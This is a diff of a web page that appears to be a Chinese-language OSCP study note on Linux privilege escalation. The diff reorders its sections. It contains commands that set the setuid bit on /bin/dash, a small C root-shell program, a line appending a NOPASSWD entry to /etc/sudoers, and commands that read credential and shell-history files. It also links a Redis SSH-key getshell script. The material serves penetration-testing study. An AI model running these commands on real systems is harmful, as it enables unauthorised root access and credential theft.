@@ -66,10 +66,11 @@ document.addEventListener('DOMContentLoaded', function () {
 <h1 id="">-</h1>
 <h1 id="WEAPONRY"><strong>[ WEAPONRY ]</strong></h1>
 <ul>
-<li><a href="/weaponry/commands/MSFVenom">MSFVenom</a></li>
-<li><a href="/weaponry/commands/Reverse-Shell">Reverse Shell</a></li>
-<li><a href="/weaponry/commands/File-Transfer">File Transfer</a></li>
+<li><a href="/weaponry/cheat-sheet/Unname">Unname</a></li>
+<li><a href="/weaponry/cheat-sheet/Reverse-Shell">Reverse Shell</a></li>
+<li><a href="/weaponry/cheat-sheet/File-Transfer">File Transfer</a></li>
 <li><a href="/weaponry/priv-esc/Linux-Priv-Esc">Linux Priv Esc</a></li>
+<li><a href="/weaponry/cheat-sheet/MSFVenom">MSFVenom</a></li>
 </ul>
 <h2 id="Kali">Kali</h2>
 <ul>
@@ -83,9 +84,9 @@ document.addEventListener('DOMContentLoaded', function () {
 </ul>
 <h2 id="Prepration">Prepration</h2>
 <ul>
-<li><a href="/oscp/Training-Plan">Training Plan</a></li>
-<li><a href="/oscp/Learning-Plan">Learning Plan</a></li>
-<li><a href="/oscp/Resources">Resources</a></li>
+<li><a href="/oscp/Prepration/Training-Plan">Training Plan</a></li>
+<li><a href="/oscp/Prepration/Learning-Plan">Learning Plan</a></li>
+<li><a href="/oscp/Prepration/Resources">Resources</a></li>
 </ul>
 <h2 id="Note">Note</h2>
 <ul>
@@ -187,26 +188,35 @@ function sidebar_toggle() {
         <div class="book-content">
           <div class="book-post">
   <h1 id="Linux-提权">Linux 提权</h1>
-<h2 id="信息泄漏">信息泄漏</h2>
-<h3 id="泄漏的账密">泄漏的账密</h3>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> -i user <span class="token punctuation">[</span>filename<span class="token punctuation">]</span>
-<span class="token function">grep</span> -i pass <span class="token punctuation">[</span>filename<span class="token punctuation">]</span>
-<span class="token function">grep</span> -C <span class="token number">5</span> <span class="token string">"password"</span> <span class="token punctuation">[</span>filename<span class="token punctuation">]</span>
-<span class="token function">find</span> <span class="token builtin class-name">.</span> -name <span class="token string">"*.php"</span> -print0 <span class="token operator">|</span> <span class="token function">xargs</span> -0 <span class="token function">grep</span> -i -n <span class="token string">"var <span class="token variable">$password</span>"</span> <span class="token comment"># Joom</span></code></pre>
-<h3 id="历史记录">历史记录</h3>
-<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> ~/.bash_history
-<span class="token function">cat</span> ~/.nano_history
-<span class="token function">cat</span> ~/.atftp_history
-<span class="token function">cat</span> ~/.mysql_history
-<span class="token function">cat</span> ~/.php_history</code></pre>
-<h2 id="Kernel-Vulns">Kernel Vulns</h2>
-<h2 id="配置不当">配置不当</h2>
+<h2 id="0-01-脚本三幻神">0.01 脚本三幻神</h2>
+<p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">LinEnum.sh</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/sleventyeleven/linuxprivchecker">linuxprivchecker.py</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/unix-privesc-check">unix-privesc-check</a></p>
+<h2 id="0-02-各种应用权限配置不当的利用方式">0.02 各种应用权限配置不当的利用方式</h2>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a></p>
+<h3 id="命令执行-姿势拓展">命令执行 姿势拓展</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 如果不能反弹 shell，别忘了 setuid</span>
+<span class="token function">chmod</span> <span class="token number">4755</span> /bin/dash
+dash
+<span class="token builtin class-name">cd</span> /root/</code></pre>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">// 还可以现写命令执行</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">// 编译，一定要同目标机器环境一致</span>
+gcc exec<span class="token punctuation">.</span>c <span class="token operator">-</span>o exec<span class="token punctuation">;</span> chmod <span class="token number">755</span> exec<span class="token punctuation">;</span> <span class="token punctuation">.</span>exec</code></pre>
+<h2 id="0-03-配置不当">0.03 配置不当</h2>
 <h3 id="系统服务的错误权限配置漏洞">系统服务的错误权限配置漏洞</h3>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /var/apache2/config.inc
 <span class="token function">cat</span> /var/lib/mysql/mysql/user.MYD
 <span class="token function">cat</span> /root/anaconda-ks.cfg</code></pre>
 <h3 id="sudo-l">sudo -l</h3>
-<h3 id="Crontab">Crontab</h3>
+<h3 id="Crontab-或者-各种-Schedule-等定时任务">Crontab 或者 各种 Schedule 等定时任务</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 检测后台定时任务</span>
+<span class="token comment"># 用那个啥来着</span></code></pre>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span> user.sh
 <span class="token builtin class-name">echo</span> <span class="token string">"user ALL=(root) NOPASSWD: ALL"</span> <span class="token operator">>></span> /etc/sudoers</code></pre>
 <p><code>/etc/crontab</code> 中加入计划任务。</p>
@@ -240,7 +250,21 @@ function sidebar_toggle() {
 
 <span class="token comment"># 从 / 开始 3 个文件夹深度的范围内查找 SGID 或 SUID ，同时不是符号链接的文件</span>
 <span class="token function">find</span> / -perm -g<span class="token operator">=</span>s -o -perm -4000 <span class="token operator">!</span> -type l -maxdepth <span class="token number">3</span> -exec <span class="token function">ls</span> -ld <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null   </code></pre>
-<h2 id="Third-Part-Service">Third Part Service</h2>
+<h2 id="0-03-信息泄漏">0.03 信息泄漏</h2>
+<h3 id="泄漏的账密">泄漏的账密</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> -i user <span class="token punctuation">[</span>filename<span class="token punctuation">]</span>
+<span class="token function">grep</span> -i pass <span class="token punctuation">[</span>filename<span class="token punctuation">]</span>
+<span class="token function">grep</span> -C <span class="token number">5</span> <span class="token string">"password"</span> <span class="token punctuation">[</span>filename<span class="token punctuation">]</span>
+<span class="token function">find</span> <span class="token builtin class-name">.</span> -name <span class="token string">"*.php"</span> -print0 <span class="token operator">|</span> <span class="token function">xargs</span> -0 <span class="token function">grep</span> -i -n <span class="token string">"var <span class="token variable">$password</span>"</span> <span class="token comment"># Joom</span></code></pre>
+<h3 id="历史记录">历史记录</h3>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> ~/.bash_history
+<span class="token function">cat</span> ~/.nano_history
+<span class="token function">cat</span> ~/.atftp_history
+<span class="token function">cat</span> ~/.mysql_history
+<span class="token function">cat</span> ~/.php_history</code></pre>
+<h2 id="0-04-Kernel-Vulns">0.04 Kernel Vulns</h2>
+<p>TODO</p>
+<h2 id="0-06-Third-Part-Service">0.06 Third Part Service</h2>
 <h3 id="Root-Redis-未授权访问">Root-Redis 未授权访问</h3>
 <p>任意角色未授权登录，公钥写入。<a target="_blank" rel="noopener" href="https://github.com/Xyntax/POC-T/blob/9d538a217cb480dbd1f94f1fa6c8154a41b5b106/script/redis-sshkey-getshell.py">redis-sshkey-getshell.py</a></p>
 
